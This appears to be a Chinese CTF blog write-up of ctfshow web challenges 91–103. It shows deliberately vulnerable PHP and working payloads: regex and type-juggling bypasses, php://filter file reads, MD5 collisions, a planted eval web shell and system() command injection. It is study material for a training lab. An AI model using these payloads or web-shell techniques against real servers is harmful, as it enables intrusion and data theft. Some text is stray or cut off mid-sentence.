<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/i表示匹配大小写，/m表示多行匹配 ， &quot;行首&quot;元字符 (^) 仅匹配字符串的开始位置**， **而&quot;行末&quot;元字符 ($) 仅匹配字符串末尾,字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true 。</span><br><span class="line"></span><br><span class="line">是要求我们多行匹配到php但是单行匹配不到php。</span><br><span class="line"></span><br><span class="line">payload：?cmd=%0aphp // %0a表示换行符</span><br></pre></td></tr></table></figure>

<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4476.1</p>
<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>先看题目，多了一个 !strpos($num, “0”) ， strpos() 函数<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">查找字符串</a>在另一字符串中第一次出现的位置 ，这里要求是第一个字符不是0，其他和上题一样，可用4476.0绕过，或者在八进制前面加空格，或者 ?num&#x3D;+4476 。</p>
</blockquote>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.0</span><br><span class="line">?num= 010574</span><br><span class="line">?num=+4476.0</span><br></pre></td></tr></table></figure>

<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num= 010574</span><br><span class="line">?num=+010574</span><br><span class="line">AI写代码12</span><br></pre></td></tr></table></figure>

<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看题目，要求u不弱等于flag.php，然后高亮u。可以推断出，flag在当前目录下的flag.php文件中。</p>
<p>payload：</p>
<p>?u&#x3D;..&#x2F;html&#x2F;flag.php<br>?u&#x3D;.&#x2F;flag.php   &#x2F;&#x2F;相对路径，  .&#x2F;表示在当前目录下<br>?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;伪协议<br>?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php   &#x2F;&#x2F;伪协议<br>?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  &#x2F;&#x2F;绝对路径</p>
<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<p>a[]&#x3D;17&amp;b[]&#x3D;17  &#x2F;&#x2F;数组<br>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>&#x2F;&#x2F;强碰撞</p>
<h3 id="web98（看不懂源码看不懂解析）"><a href="#web98（看不懂源码看不懂解析）" class="headerlink" title="web98（看不懂源码看不懂解析）"></a>web98（看不懂源码看不懂解析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG&#x3D;flag就可以了 payload ?HTTP_FLAG&#x3D;随便输         &#x2F;&#x2F;GET HTTP_FLAG&#x3D;flag           &#x2F;&#x2F;POST</p>
<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$allow &#x3D; array(); 创建一个空数组array</p>
<p>for ($i&#x3D;36; $i &lt; 0x36d; $i++) {  for循环，i从36到0x36d逐渐+1</p>
<p>array_push($allow, rand(1,$i));  $allow是个数组，arraypush把从1到i的一个随机数入栈</p>
<p>if(isset($_GET[‘n’]) &amp;&amp; in_array($_GET[‘n’], $allow)){ 接受在这个数组里的n，让n作为文件名</p>
<p>PHP里的弱类型比较在字符串和数字比较的时候会尝试把字符串转为数字，所以1.php和1是这里是相等的。</p>
<p>由于这个数组的末尾一开始是从36开始增加，所以这个数组本来就有1-36的随机push，所以1-36出现的概率最大，我们这里让n&#x3D;1.php,content&#x3D;<code>&lt;?PHP eval($_POST[1]);?&gt;</code>反复执行几次，再访问1.php并发送1&#x3D;system(‘ls’);就好。</p>
<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里考察了&#x3D;和and的优先级，&amp;&amp;&gt;||&gt;&#x3D;&gt;and&gt;or</p>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>

<p>这一行是意思是，v1是否是数字复制给v0，再检查v2v3是不是数字，所以只需要v1是数字就能让v0&#x3D;1。</p>
<p>后面有没有分号什么的不说了。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)/*&amp;v3=*/;     //利用注释</span><br><span class="line">?v1=1&amp;v2=system(&#x27;tac ctfshow.php&#x27;)&amp;v3=;         //直接打也行</span><br><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;          //使用反射类直接输出class ctfshow的信息</span><br><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;                //因为这个flag在ctfshow这个类中，直接打印变量</span><br><span class="line">//var_dump($ctfshow)：打印变量 $ctfshow 的详细信息。</span><br></pre></td></tr></table></figure>

<h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow; 注意这一句的存在。</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;          //使用反射类直接输出class ctfshow的信息</span><br></pre></td></tr></table></figure>

<p>这个题太坑了，先要把0x2d换成</p>
<h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>原生类是PHP自带的类，这些类方便开发人员完成系统底层或常用的功能，比如操作系统、数据库、反射、异常处理等。</p>
<p>ReflectionClass是PHP自带的反射（Reflection）类。反射简单来说就是程序在运行时能查看自己的结构和信息，就像“照镜子”一样。</p>
<p>它可以让你在代码运行时查看一个类的详细信息，包括类名，方法，属性等。</p>
<p>假设你有一个类叫 <code>ctfshow</code>，你想知道这个类里面有什么属性和方法，你就可以用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;ctfshow&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$ref</span>);</span><br></pre></td></tr></table></figure>

<p>它会告诉你很多关于 <code>ctfshow</code> 类的结构信息。</p>
<h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>这两题就差一个短标签绕过，一起理解了。首先v2是数字v4就是1。选取v2从第二个位置开始的字符作为指定函数的参数。最后把运行结果放到v3里。</p>
<p>这个题目的payload属于意料之外情理之中，就是把放入的命令先短标签绕过，再base64编码，再转换成ASCII编码，开头加上两个占位字符，就是我们的v2。</p>
<p>为什么v2可以通过is_numeric呢？因为PHP是一个字符串里面有e就会判定为数字的语言。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">输出   5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>

<p>这里有个e，就是能过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=x.php                 //GET</span></span><br><span class="line"><span class="comment">//str=PD89YGNhdCAqYDs(&lt;?=`cat *`;   的base64编码)</span></span><br><span class="line">v1=hex2bin                           <span class="comment">//POST</span></span><br></pre></td></tr></table></figure>



<p>然后url+x.php访问查看源代码什么都有了。</p>
